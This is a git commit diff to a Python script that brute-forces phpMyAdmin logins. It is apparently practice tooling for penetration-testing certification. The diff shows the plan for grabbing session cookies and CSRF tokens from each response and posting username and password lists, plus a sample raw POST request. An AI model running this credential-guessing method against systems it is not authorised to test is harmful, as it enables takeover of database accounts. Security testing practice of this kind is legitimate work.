19432baf5cb8dcdd59ae86dcd183f884184042c5
jonnyzar <some@jonnyzar.com>
2023-02-13 10:19:18 +0100

    post

--- WebTools/smart_brute.py
+++ WebTools/smart_brute.py
@@ -1,45 +1,18 @@
 '''
-This script was developed from example of brute forcing phpmyadmin site to assisst in developing similar Tools for self
-assessment of own web applications
-
-#POST1
-
-Cookie: phpMyAdmin=bde288434629d8f3e69b26d107633223
-
-
-set_session=bde288434629d8f3e69b26d107633223&pma_username=ok&pma_password=okasd&server=1&target=index.php&lang=en&debug=0&token=a3809bbcae52f70e6beeef86b20ff414
-
-
-# Resp1
-
-
-Set-Cookie: phpMyAdmin=bde288434629d8f3e69b26d107633223; path=/
-Set-Cookie: phpMyAdmin=51094657b2bc41758bccb0c61d6d6da1; path=/
-
-
-   <input type="hidden" name="token" value="b6827a7ae7418c42e289d9213a75c482">
-
-
-# POST 2
-
-
-
-Cookie: phpMyAdmin=51094657b2bc41758bccb0c61d6d6da1
-
-
-set_session=51094657b2bc41758bccb0c61d6d6da1&pma_username=sdfg&pma_password=sdfgdfgsdfg&server=1&target=index.php&lang=en&debug=0&token=b6827a7ae7418c42e289d9213a75c482
+This script was developed from example of brute forcing phpmyadmin site to assisst in developing similar Tools for self assessment of own web applications
 
 
 #######
 
 So need to write a python program that does following:
 
-1. grabs from every response the token from html body 
-AND second cookie in RESPONSE which is not equal to the cookie from initial POST request
+1. grabs from every response the set_session cookie and token from html body 
 
-2. make a POST request with
+2. make a POST request with grabbed items
 
-set_session=CURRENT_COOKIE&pma_username=root&pma_password=PASS_LIST&server=1&target=index.php&lang=en&debug=0&token=FORM_TOKEN
+phpMyAdmin cookie = set_session_cookie
+
+set_session=set_session_cookie&pma_username=USER_LIST&pma_password=PASS_LIST&server=1&target=index.php&lang=en&debug=0&token=FORM_TOKEN
 
 3. evaluate to not have "Login Failed" in reposnse body
 '''
@@ -57,8 +30,28 @@ PASS_FILE = sys.argv[3]
 
 def forge_post(url, token, cookie, username, password):
 
+    #Template
+    '''
+    POST /index.php HTTP/1.1
+    Host: 192.168.164.52
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 168
+    Origin: null
+    Connection: close
+    Cookie: phpMyAdmin=1c40ba8456f1825f791056a366834e94
+    Upgrade-Insecure-Requests: 1
+
+    set_session=1c40ba8456f1825f791056a366834e94&pma_username=dfgdfg&pma_password=dfgdfgdfg&server=1&target=index.php&lang=en&debug=0&token=c392014ef9958cce5d96b4b0bffa2879
+    '''
+
+
     cookie = {
-        "phpMyAdmin":cookie,
+        "User-Agent" : "OSCP_tester",
+        "phpMyAdmin":cookie
     }
 
     payload ={
